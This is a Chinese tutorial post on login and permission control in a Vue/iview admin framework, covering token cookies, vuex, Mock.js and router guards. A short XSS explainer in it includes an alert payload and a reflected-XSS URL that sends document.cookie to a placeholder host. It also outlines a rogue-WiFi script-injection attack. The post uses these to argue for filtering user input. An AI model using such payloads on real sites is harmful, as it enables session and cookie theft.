data-id=\"heading-4\">登录流程</h4>\n<p>在客户端发送账号密码到服务端，服务端验证成功后返回token存储用户的权限，前端用Cookie把token存储在本地，在路由跳转（router.beforeEach）中判断是否存在token，另外前端可以通过token请求服务端获取userInfo，在vuex中存储着用户的信息（用户名，头像，注册时间等等）。</p>\n<h4 id=\"-\" data-id=\"heading-5\">权限控制</h4>\n<p>就是在路由跳转（router.beforeEach）中判断token中的权限和要去往(to)页面的路由信息(router meta)中配置的权限是否匹配，同时我们的侧边栏也是根据权限动态生成的，当所登录的账号没有权限访问时，就不显示在侧边栏中（例如访客登录就无法看到编辑器的侧边栏选项），这样用户既看不到侧边栏选项，又无法直接访问到，双重控制更安全。</p>\n<p>登录界面只有两个输入框，因为不是对外网站所以就没做注册功能。<br></p><figure><img alt=\"login.vue\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/19/159b04096a99fd4fdc46eacd17288eea?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>login.vue</figcaption></figure><p></p>\n<p>首先来看登录界面login.vue的逻辑。</p>\n<p></p><figure><img alt=\"src/views/login/index.vue\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/19/5f9b28a9649d1b25544cdd02a70cd6a8?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>src/views/login/index.vue</figcaption></figure><p></p>\n<p>使用了iview的form表单，</p>\n<pre><code class=\"hljs bash\">autoComplete属性是自动填充默认值到输入框里，这里是用户名amdin@wz.com，\n\n@keyup.enter.native=<span class=\"hljs-string\">\"handleLogin\"</span>属性，当按下enter键时会自动触发handleLogin函数，不需要再点击登录按钮，符合日常登录习惯。\n当输入账号密码点击登录按钮会触发handleLogin函数。</code></pre><p> </p><figure><img alt=\"src/views/login/index.vue\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/19/1d56468b6a73357777bb0cd0773a33db?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>src/views/login/index.vue</figcaption></figure><p></p>\n<p>其中的逻辑是，获取页面表单中的数据（账号密码）通过表格validate验证正确性，依照的规范就是我们在data属性中定义的。</p>\n<pre><code class=\"hljs javascript\"> data() {\n        <span class=\"hljs-keyword\">const</span> validateEmail = <span class=\"hljs-function\">(<span class=\"hljs-params\">rule, value, callback</span>) =&gt;</span> {\n          <span class=\"hljs-keyword\">if</span> (!isWscnEmail(value)) {\n            <span class=\"hljs-comment\">//export function isWscnEmail(str) {</span>\n            <span class=\"hljs-comment\">//const reg = /^[a-z0-9](?:[-_.+]?[a-z0-9]+)*@wz\\.com$/i;</span>\n            <span class=\"hljs-comment\">//return reg.test(str.trim());</span>\n            <span class=\"hljs-comment\">//}</span>\n            callback(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Error</span>(<span class=\"hljs-string\">'请输入正确的合法邮箱'</span>));\n          } <span class=\"hljs-keyword\">else</span> {\n            callback();\n          }\n        };\n        <span class=\"hljs-keyword\">const</span> validatePass = <span class=\"hljs-function\">(<span class=\"hljs-params\">rule, value, callback</span>) =&gt;</span> {\n          <span class=\"hljs-keyword\">if</span> (value.length &lt; <span class=\"hljs-number\">6</span>) {\n            callback(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Error</span>(<span class=\"hljs-string\">'密码不能小于6位'</span>));\n          } <span class=\"hljs-keyword\">else</span> {\n            callback();\n          }\n        };\n        <span class=\"hljs-keyword\">return</span> {\n          <span class=\"hljs-attr\">loginForm</span>: {\n            <span class=\"hljs-attr\">email</span>: <span class=\"hljs-string\">'admin@wz.com'</span>,\n            <span class=\"hljs-attr\">password</span>: <span class=\"hljs-string\">''</span>\n          },\n          <span class=\"hljs-attr\">loginRules</span>: {\n            <span class=\"hljs-attr\">email</span>: [\n                { <span class=\"hljs-attr\">required</span>: <span class=\"hljs-literal\">true</span>, <span class=\"hljs-attr\">trigger</span>: <span class=\"hljs-string\">'blur'</span>, <span class=\"hljs-attr\">validator</span>: validateEmail }\n            ],\n            <span class=\"hljs-attr\">password</span>: [\n                { <span class=\"hljs-attr\">required</span>: <span class=\"hljs-literal\">true</span>, <span class=\"hljs-attr\">trigger</span>: <span class=\"hljs-string\">'blur'</span>, <span class=\"hljs-attr\">validator</span>: validatePass }\n            ]\n          },\n          <span class=\"hljs-attr\">loading</span>: <span class=\"hljs-literal\">false</span>,\n          <span class=\"hljs-attr\">showDialog</span>: <span class=\"hljs-literal\">false</span>\n        }\n      },</code></pre><p>账号密码必须填写，密码不能小于6位，账号必须是以wz.com结尾的电子邮箱地址， 或者可以定义更严密的规范。<br> 如果不遵守制定的规范，将会无法登陆。</p>\n<p><strong>千万不要相信用户的输入！千万不要相信用户的输入！千万不要相信用户的输入！</strong></p>\n<p>除非你想遭受<strong>XSS攻击</strong>。</p>\n<h3 id=\"xss-\" data-id=\"heading-6\">XSS攻击</h3>\n<p>如果有同学还不了解什么是XSS攻击，那么一定要赶快去了解。<br>下面敲黑板了！划重点！</p>\n<blockquote>\n<p>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。</p>\n</blockquote>\n<p>其重点是“跨域”和“客户端执行”。有人将XSS攻击分为三种，分别是：</p>\n<ol>\n<li>Reflected XSS（基于反射的XSS攻击）</li>\n<li>Stored XSS（基于存储的XSS攻击）</li>\n<li>DOM-based or local XSS（基于DOM或本地的XSS攻击）</li>\n</ol>\n<p><strong>Reflected XSS</strong><br>基于反射的XSS攻击，主要依靠站点服务端返回脚本，在客户端触发执行从而发起Web攻击。<br><strong>例子：</strong></p>\n<ol>\n<li>做个假设，在淘宝搜索书籍，搜不到书的时候显示提交的名称。</li>\n<li>在搜索框搜索内容，填入<code>&lt;script&gt;alert('handsome boy')&lt;/script&gt;</code>, 点击搜索。</li>\n<li>当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。</li>\n<li>进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：<code>http://www.amazon.cn/search?name=&lt;script&gt;document.location='http://xxx/get?cookie='+document.cookie&lt;/script&gt;</code></li>\n</ol>\n<p><strong>Stored XSS</strong><br>基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。<br><strong>例子：</strong></p>\n<ol>\n<li><p>发一篇文章，里面包含了恶意脚本<br>今天天气不错啊！<code>&lt;script&gt;alert('handsome boy')&lt;/script&gt;</code></p>\n</li>\n<li><p>后端没有对文章进行过滤，直接保存文章内容到数据库。</p>\n</li>\n<li>当其他看这篇文章的时候，包含的恶意脚本就会执行。<br>PS：因为大部分文章是保存整个HTML内容的，前端显示时候也不做过滤，就极可能出现这种情况。</li>\n</ol>\n<p><strong>DOM-based or local XSS</strong><br>基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。<br><strong>例子：</strong></p>\n<ol>\n<li>提供一个免费的wifi。</li>\n<li>开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。</li>\n<li>之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。</li>\n<li>收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。</li>\n<li>当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。</li>\n</ol>\n<p>所以一定要对用户的输入做一个过滤。否则后台都被别人给黑了，老板不炒你鱿鱼才怪。<br>当我们输入不正确的账号密码时将会自动验证（输入完立即验证而不是等到点击登录才验证），如果不正确将无法登录。<br></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/19/0669ab870bb3943d1a62406093a8dd52?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><br>如果符合验证规则，则会触发vuex中的LoginByEmail <p></p>\n<p>src/store/modules/user.js</p>\n<pre><code class=\"hljs bash\">import { loginByEmail, <span class=\"hljs-built_in\">logout</span>, getInfo } from <span class=\"hljs-string\">'api/login'</span>;\n\n LoginByEmail({ commit }, userInfo) {\n      const email = userInfo.email.trim();\n      <span class=\"hljs-built_in\">return</span> new Promise((resolve, reject) =&gt; {\n        loginByEmail(email, userInfo.password).then(response =&gt; {\n          const data = response.data;\n          console.log(response.data);\n          Cookies.set(<span class=\"hljs-string\">'Admin-Token'</span>, response.data.token);\n          commit(<span class=\"hljs-string\">'SET_TOKEN'</span>, data.token);\n          commit(<span class=\"hljs-string\">'SET_EMAIL'</span>, email);\n          resolve();\n        }).catch(error =&gt; {\n          reject(error);\n        });\n      });\n    },</code></pre><p>把email和password发送到服务器，接受返回来的数据，将token存入 Cookies，并触发vuex SET_TOKEN及SET_EMAIL事件，存入到vuex全局状态里。<br>src/api/login.js loginByEmail</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">export</span> <span class=\"hljs-keyword\">function</span> loginByEmail(email, password) {\n  const data = {\n    email,\n    password\n  };\n  <span class=\"hljs-built_in\">return</span> fetch({\n    url: <span class=\"hljs-string\">'/login/loginbyemail'</span>,\n    method: <span class=\"hljs-string\">'post'</span>,\n    data\n  });\n}</code></pre><p>发送fetch请求到指定的url。这里的url是本地服务器的地址，本项目因为是纯前端项目，所以使用了 mock.js。</p>\n<h3 id=\"mock-js\" data-id=\"heading-7\">Mock.js</h3>\n<p>有了这个插件，前端就可以独立后端开发。</p>\n<pre><code class=\"hljs bash\">Mock.mock(/\\/login\\/loginbyemail/, <span class=\"hljs-string\">'post'</span>, loginAPI.loginByEmail);</code></pre><p>在mock.js中这行代码截获了所有/login/loginbyemail 路径的请求，使用loginAPI.loginByEmail处理这个请求</p>\n<pre><code class=\"hljs bash\">const userMap = {\n  admin: {\n    role: [<span class=\"hljs-string\">'admin'</span>],\n    token: <span class=\"hljs-string\">'admin'</span>,\n    introduction: <span class=\"hljs-string\">'我是超级管理员'</span>,\n    name: <span class=\"hljs-string\">'Super Admin'</span>,\n    uid: <span class=\"hljs-string\">'001'</span>\n  },\n  editor: {\n    role: [<span class=\"hljs-string\">'editor'</span>],\n    token: <span class=\"hljs-string\">'editor'</span>,\n    introduction: <span class=\"hljs-string\">'我是编辑'</span>,\n    name: <span class=\"hljs-string\">'Normal Editor'</span>,\n    uid: <span class=\"hljs-string\">'002'</span>\n\n\n  },\n  developer: {\n    role: [<span class=\"hljs-string\">'develop'</span>],\n    token: <span class=\"hljs-string\">'develop'</span>,\n    introduction: <span class=\"hljs-string\">'我是开发'</span>,\n    name: <span class=\"hljs-string\">'工程师小王'</span>,\n    uid: <span class=\"hljs-string\">'003'</span>\n  }\n}\n\n<span class=\"hljs-built_in\">export</span> default {\n  loginByEmail: config =&gt; {\n    const { email } = JSON.parse(config.body);\n      <span class=\"hljs-built_in\">return</span> userMap[email.split(<span class=\"hljs-string\">'@'</span>)[0]];\n  },\n  getInfo: config =&gt; {\n    const { token } = param2Obj(config.url);\n    <span class=\"hljs-keyword\">if</span> (userMap[token]) {\n      <span class=\"hljs-built_in\">return</span> userMap[token];\n    } <span class=\"hljs-keyword\">else</span> {\n      <span class=\"hljs-built_in\">return</span> Promise.reject(<span class=\"hljs-string\">'a'</span>);\n    }\n  },\n  <span class=\"hljs-built_in\">logout</span>: () =&gt; <span class=\"hljs-string\">'success'</span>\n};</code></pre><p>可以看到loginByEmail的作用是把账户信息返回前端，例如一个用户是管理员，就把匹配到的admin的账户信息返回去。<br>当得到了admin的账户信息，就把它存储在cookie里<br>Cookies.set('Admin-Token', response.data.token);</p>\n<p>这样一来在login.js中判断token是否存在，如果存在token，就继续路由跳转，如果不存在，就跳转到登录界面。<br>src/login.js</p>\n<pre><code class=\"hljs bash\">router.beforeEach((to, from, next) =&gt; {\n  NProgress.start() // 开启Progress\n  <span class=\"hljs-keyword\">if</span> (store.getters.token) { // 判断是否有token，从vuex中取出\n    <span class=\"hljs-keyword\">if</span> (to.path === <span class=\"hljs-string\">'/login'</span>) {\n      next({ path: <span class=\"hljs-string\">'/'</span> })\n    } <span class=\"hljs-keyword\">else</span> {\n      <span class=\"hljs-keyword\">if</span> (store.getters.roles.length === 0) { // 判断当前用户是否已拉取完user_info信息\n        store.dispatch(<span class=\"hljs-string\">'GetInfo'</span>).then(res =&gt; { // 拉取user_info\n          const roles = res.data.role\n          store.dispatch(<span class=\"hljs-string\">'GenerateRoutes'</span>, { roles }).then(() =&gt; { // 生成可访问的路由表\n            router.addRoutes(store.getters.addRouters) // 动态添加可访问路由表\n            next({ ...to }) // hack方法 确保addRoutes已完成\n          })\n        }).catch(() =&gt; {\n          store.dispatch(<span class=\"hljs-string\">'FedLogOut'</span>).then(() =&gt; {\n            next({ path: <span class=\"hljs-string\">'/login'</span> })\n          })\n        })\n      } <span class=\"hljs-keyword\">else</span> {\n        // 没有动态改变权限的需求可直接next() 删除下方权限判断 ↓\n        <span class=\"hljs-keyword\">if</span> (hasPermission(store.getters.roles, to.meta.role)) {\n          next()//\n        } <span class=\"hljs-keyword\">else</span> {\n          next({ path: <span class=\"hljs-string\">'/'</span>, query: { noGoBack: <span class=\"hljs-literal\">true</span> }})\n        }\n        // 可删 ↑\n      }\n    }\n  } <span class=\"hljs-keyword\">else</span> {\n    <span class=\"hljs-keyword\">if</span> (whiteList.indexOf(to.path) !== -1) { // 在免登录白名单，直接进入\n      next()\n    } <span class=\"hljs-keyword\">else</span> {\n      next(<span class=\"hljs-string\">'/login'</span>) // 否则全部重定向到登录页\n      NProgress.done() // 在<span class=\"hljs-built_in\">hash</span>模式下 改变手动改变<span class=\"hljs-built_in\">hash</span> 重定向回来 不会触发afterEach 暂时hack方案 ps：<span class=\"hljs-built_in\">history</span>模式下无问题，可删除该行！\n    }\n  }\n})</code></pre><p>src/store/modules/user.js</p>\n<p>vuex中是这样定义的，相当于直接Cookies.get()，为什么要分开呢？显然是为了模块化，方便日后改动项目。</p>\n<pre><code class=\"hljs bash\">const user = {\n  state: {\n    user: <span class=\"hljs-string\">''</span>,\n    status: <span class=\"hljs-string\">''</span>,\n    email: <span class=\"hljs-string\">''</span>,\n    code: <span class=\"hljs-string\">''</span>,\n    uid: undefined,\n    auth_type: <span class=\"hljs-string\">''</span>,\n    token: Cookies.get(<span class=\"hljs-string\">'Admin-Token'</span>),\n    name: <span class=\"hljs-string\">''</span>,\n    avatar: <span class=\"hljs-string\">''</span>,\n    introduction: <span class=\"hljs-string\">''</span>,\n    roles: [],\n    setting: {\n      articlePlatform: []\n    }\n  },</code></pre><p>vuex会从cookies里面取得token的值，这样就能通过验证去往路由的下个页面。</p>\n<p><strong>接下来的教程讲一下封装UI组件、router、webpack、node命令行构建工具等内容。</strong><br><strong>希望大家看了这系列教程都能制作出自己的前端框架，从而在工作中得心应手。</strong></p>\n<p><strong>如果喜欢就点个start鼓励下作者吧。</strong></p>\n<p><strong>github地址：<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fherozhou%2Fvue-framework-wz\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">vue-framework-wz</a></strong><br><strong>线上体验地址：<a href=\"https://link.juejin.im?target=http%3A%2F%2Fherozhou.coding.me%2Fvue-framework-wz%2F%23%2Fdashboard\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">立即体验</a></strong></p>\n</div>"}]